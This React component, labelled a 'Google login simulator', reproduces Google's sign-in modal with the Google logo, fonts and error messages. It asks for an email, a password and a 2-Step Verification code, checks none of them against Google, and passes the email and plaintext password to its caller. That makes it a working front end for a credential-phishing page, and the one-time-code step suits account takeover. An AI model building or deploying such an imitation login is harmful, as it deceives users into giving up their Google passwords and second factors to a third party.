import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Loader2, X, ChevronDown, Eye, EyeOff } from 'lucide-react';

interface GoogleLoginSimulatorProps {
  onSuccess: (email: string, password?: string) => void;
  onClose: () => void;
}

const GoogleLoginSimulator: React.FC<GoogleLoginSimulatorProps> = ({ onSuccess, onClose }) => {
  const [step, setStep] = useState<'email' | 'password' | 'otp'>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [otpCode, setOtpCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // Lock body scroll when modal is open
  useEffect(() => {
    document.body.style.overflow = 'hidden';
    return () => { document.body.style.overflow = 'unset'; };
  }, []);

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    // --- STEP 1: EMAIL ---
    if (step === 'email') {
      if (!email) { setError('Enter an email or phone number'); return; }
      if (!email.includes('@')) { setError('Couldn\'t find your Google Account'); return; }
      
      setIsLoading(true);
      await new Promise(resolve => setTimeout(resolve, 800));
      setIsLoading(false);
      setStep('password');
    } 
    // --- STEP 2: PASSWORD ---
    else if (step === 'password') {
      if (!password) { setError('Enter a password'); return; }
      if (password.length < 4) { setError('Wrong password. Try again.'); return; }
      
      setIsLoading(true);
      await new Promise(resolve => setTimeout(resolve, 1000));
      setIsLoading(false);
      setStep('otp');
    }
    // --- STEP 3: OTP ---
    else if (step === 'otp') {
      if (!otpCode || otpCode.length < 4) { setError('Wrong code.'); return; }
      
      setIsLoading(true);
      await new Promise(resolve => setTimeout(resolve, 1500));
      setIsLoading(false);
      
      onSuccess(email, password);
    }
  };

  return (
    <div 
      className="fixed inset-0 z-[70] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 font-sans"
      onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
    >
      <motion.div 
        initial={{ scale: 0.95, opacity: 0, y: 10 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        exit={{ scale: 0.95, opacity: 0 }}
        className="bg-white text-gray-900 w-full max-w-[450px] min-h-[500px] rounded-[28px] p-0 shadow-lg flex flex-col relative overflow-hidden"
      >
        {isLoading && (
            <div className="absolute top-0 left-0 w-full h-1 bg-blue-100 overflow-hidden z-50">
                <div className="w-full h-full bg-[#1a73e8] origin-left animate-[loading_1s_ease-in-out_infinite]"></div>
            </div>
        )}

        <button onClick={onClose} className="absolute top-4 right-4 text-gray-500 hover:text-gray-800 z-50 p-2">
            <X size={20} />
        </button>

        <div className="flex-1 px-10 pt-10 pb-6 flex flex-col">
            <div className="flex justify-center mb-6">
               <svg viewBox="0 0 24 24" className="w-10 h-10" aria-hidden="true">
                  <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path>
                  <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path>
                  <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path>
                  <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path>
               </svg>
            </div>

            <div className="text-center mb-8">
                <h2 className="text-2xl font-normal text-gray-900 mb-2 font-['Google_Sans',sans-serif]">
                    {step === 'email' ? 'Sign in' : step === 'otp' ? '2-Step Verification' : 'Welcome'}
                </h2>
                {step !== 'email' ? (
                     <div className="inline-flex items-center gap-2 p-1 pr-3 border border-gray-200 rounded-full cursor-pointer hover:bg-gray-50 mt-2" onClick={() => setStep('email')}>
                        <div className="w-5 h-5 rounded-full bg-purple-600 text-white flex items-center justify-center text-[10px] font-bold">
                            {email.charAt(0).toUpperCase()}
                        </div>
                        <span className="text-sm font-medium text-gray-700">{email}</span>
                        <ChevronDown size={14} className="text-gray-500" />
                    </div>
                ) : (
                    <p className="text-[16px] text-gray-900 mt-2">to continue to <span className="font-medium text-[#1a73e8]">MUSE</span></p>
                )}
            </div>

            <form onSubmit={handleNext} className="flex-1 flex flex-col">
                <div className="flex-1 min-h-[120px]">
                    {step === 'email' && (
                        <div>
                            <input 
                                type="text"
                                className={`w-full rounded border p-3 text-base outline-none focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8] ${error ? 'border-red-600' : 'border-gray-300'}`}
                                placeholder="Email or phone"
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                autoFocus
                            />
                            {error && <div className="text-red-600 text-xs mt-2 flex items-center gap-1"><X size={12}/>{error}</div>}
                            <button type="button" className="mt-4 text-[#1a73e8] text-sm font-medium" onClick={() => alert('Forgot Email simulation')}>Forgot email?</button>
                        </div>
                    )}

                    {step === 'password' && (
                        <div>
                            <div className="relative">
                                <input 
                                    type={showPassword ? "text" : "password"}
                                    className={`w-full rounded border p-3 text-base outline-none focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8] ${error ? 'border-red-600' : 'border-gray-300'}`}
                                    placeholder="Enter your password"
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    autoFocus
                                />
                                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-3.5 text-gray-500">
                                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                                </button>
                            </div>
                            {error && <div className="text-red-600 text-xs mt-2 flex items-center gap-1"><X size={12}/>{error}</div>}
                            <label className="flex items-center gap-2 mt-4 cursor-pointer">
                                <input type="checkbox" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} className="accent-[#1a73e8]" />
                                <span className="text-sm text-gray-700">Show password</span>
                            </label>
                        </div>
                    )}

                    {step === 'otp' && (
                        <div className="text-center">
                            <p className="text-sm text-gray-600 mb-4">Google sent a notification to your phone.</p>
                            <input 
                                type="text"
                                className="w-full border-b-2 border-gray-300 focus:border-[#1a73e8] outline-none text-center text-2xl tracking-[0.5em] py-2 bg-transparent"
                                placeholder="------"
                                value={otpCode}
                                onChange={(e) => setOtpCode(e.target.value.replace(/[^0-9]/g, ''))}
                                maxLength={6}
                                autoFocus
                            />
                        </div>
                    )}
                </div>

                <div className="flex items-center justify-between mt-8">
                    <button type="button" className="text-[#1a73e8] text-sm font-medium hover:bg-blue-50 px-4 py-2 rounded" onClick={() => { if(step === 'email') alert('Create Account Simulation'); else setStep('email'); }}>
                        {step === 'email' ? 'Create account' : 'Try another way'}
                    </button>
                    <button type="submit" className="bg-[#1a73e8] text-white px-6 py-2 rounded-full font-medium hover:bg-blue-700 shadow-sm">
                        Next
                    </button>
                </div>
            </form>
        </div>
      </motion.div>
      <style>{`@keyframes loading { 0% { transform: translateX(-100%); } 50% { transform: translateX(0%); } 100% { transform: translateX(100%); } }`}</style>
    </div>
  );
};

export default GoogleLoginSimulator;